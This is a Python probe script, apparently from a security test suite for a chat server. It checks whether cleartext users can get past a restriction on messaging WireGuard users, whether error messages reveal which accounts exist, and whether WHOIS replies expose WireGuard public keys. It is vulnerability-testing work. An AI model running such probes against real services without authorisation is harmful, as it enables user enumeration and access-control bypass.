"""
PROBE 06 — Cross-Transport DM Restriction Bypass
Hypothesis: Cleartext users cannot DM Wireguard users. Does the error
distinguish WG users from non-existent users? Does WHOIS leak WG public keys?
"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

import time
from vulnerabilities.lib.probe import make_handle, connect_cleartext, send_recv, report

def run():
    sock, session, username = connect_cleartext()

    # Get user list
    response = send_recv(sock, {
        'request_type': 14, 'session': session, 'request_handle': make_handle()
    })
    users = response.get(b'users', []) if response else []
    print(f"Users online: {[u.decode() for u in users]}")

    # WHOIS each user to find Wireguard users
    wg_users = []
    clear_users = []
    for user in users:
        whois = send_recv(sock, {
            'request_type': 10, 'session': session,
            'request_handle': make_handle(), 'username': user.decode()
        })
        transport = whois.get(b'transport', b'').decode() if whois else ''
        print(f"  {user.decode()}: transport={transport}")
        if 'wireguard' in transport:
            wg_users.append(user.decode())
        else:
            clear_users.append(user.decode())
        time.sleep(0.2)

    print(f"\nWireguard users: {wg_users}")

    # Try to DM a Wireguard user from cleartext
    dm_succeeded = False
    key_leaked = False
    error_differs = False
    wg_error = None
    nonexist_error = None

    for wg_user in wg_users[:2]:
        response = send_recv(sock, {
            'request_type': 12, 'session': session,
            'request_handle': make_handle(),
            'to_username': wg_user,
            'message': 'probe test message'
        })
        print(f"DM to WG user {wg_user}: {response}")
        if response and response.get(b'response_type') not in (None, 20):
            dm_succeeded = True
        wg_error = response.get(b'error') if response else None
        time.sleep(0.3)

    # Error for non-existent user
    nonexist_resp = send_recv(sock, {
        'request_type': 12, 'session': session,
        'request_handle': make_handle(),
        'to_username': 'nonexistent-xyz-abc-123',
        'message': 'probe'
    })
    nonexist_error = nonexist_resp.get(b'error') if nonexist_resp else None
    print(f"DM to nonexistent user error: {nonexist_error}")

    if wg_error and nonexist_error and wg_error != nonexist_error:
        error_differs = True
        print(f"ERROR MESSAGES DIFFER — user existence revealed!")
        print(f"  WG user error:         {wg_error}")
        print(f"  Nonexistent user error: {nonexist_error}")

    # Check if WHOIS leaks WG public keys to cleartext users
    for wg_user in wg_users[:2]:
        whois = send_recv(sock, {
            'request_type': 10, 'session': session,
            'request_handle': make_handle(), 'username': wg_user
        })
        pub_key = whois.get(b'wireguard_public_key', b'') if whois else b''
        if pub_key:
            key_leaked = True
            print(f"WG public key leaked to cleartext user: {pub_key.hex()}")
        time.sleep(0.2)

    vulnerable = dm_succeeded or key_leaked or error_differs
    evidence = []
    if dm_succeeded:
        evidence.append("Cleartext user could DM Wireguard user")
    if key_leaked:
        evidence.append("Wireguard public key exposed to cleartext user")
    if error_differs:
        evidence.append(f"Error messages distinguish WG users from nonexistent (wg={wg_error}, nonexist={nonexist_error})")

    report(
        'PROBE 06 — Cross-Transport DM Restriction Bypass',
        "Cleartext DM to WG user succeeds, or WHOIS leaks WG keys, or errors reveal user existence",
        {'dm_succeeded': dm_succeeded, 'key_leaked': key_leaked, 'error_differs': error_differs},
        vulnerable,
        evidence='; '.join(evidence) if evidence else "No issues found"
    )
    sock.close()

if __name__ == '__main__':
    run()
